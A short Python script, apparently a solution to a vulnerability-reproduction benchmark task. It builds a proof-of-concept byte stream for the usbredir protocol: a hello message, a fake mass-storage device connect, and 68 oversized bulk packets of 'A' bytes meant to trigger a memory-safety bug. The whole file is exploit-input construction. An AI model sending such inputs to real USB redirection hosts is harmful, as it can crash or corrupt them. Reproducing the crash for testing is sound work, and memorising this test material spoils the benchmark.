import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        USB_REDIR_HELLO = 1
        USB_REDIR_DEVICE_CONNECT = 5
        USB_REDIR_BULK_PACKET = 12

        poc_parts = []
        msg_id_counter = 0

        def create_header(msg_type, payload_len):
            nonlocal msg_id_counter
            header = struct.pack('<IIQ', msg_type, payload_len, msg_id_counter)
            msg_id_counter += 1
            return header

        version = b"0.1.0\0".ljust(64, b'\0')
        caps = b'\0' * 32
        hello_payload = version + caps
        poc_parts.append(create_header(USB_REDIR_HELLO, len(hello_payload)))
        poc_parts.append(hello_payload)

        dev_type = 0
        speed = 3
        dev_class = 8
        subclass = 6
        protocol = 80
        vid = 0x1234
        pid = 0x5678
        dev_connect_hdr = struct.pack('<BBBBBHH',
                                      dev_type, speed, dev_class, subclass,
                                      protocol, vid, pid)
        
        ifc_count = 1
        
        ifc_info_class = 8
        ifc_info_subclass = 6
        ifc_info_protocol = 80
        ifc_num = 0
        ep_count = 2
        ifc_info = struct.pack('<BBBBB',
                               ifc_info_class, ifc_info_subclass, ifc_info_protocol,
                               ifc_num, ep_count)

        ep1_info = struct.pack('<BBB', 2, 0, 0x81)
        ep2_info = struct.pack('<BBB', 2, 0, 0x02)

        dev_connect_payload = (dev_connect_hdr +
                               struct.pack('<B', ifc_count) +
                               ifc_info +
                               ep1_info +
                               ep2_info)
        
        poc_parts.append(create_header(USB_REDIR_DEVICE_CONNECT, len(dev_connect_payload)))
        poc_parts.append(dev_connect_payload)

        num_packets = 68
        data_size = 1024
        bulk_data = b'A' * data_size
        out_endpoint = 0x02

        for _ in range(num_packets):
            bulk_payload_header = struct.pack('<BI', out_endpoint, data_size)
            bulk_payload = bulk_payload_header + bulk_data
            
            poc_parts.append(create_header(USB_REDIR_BULK_PACKET, len(bulk_payload)))
            poc_parts.append(bulk_payload)

        return b''.join(poc_parts)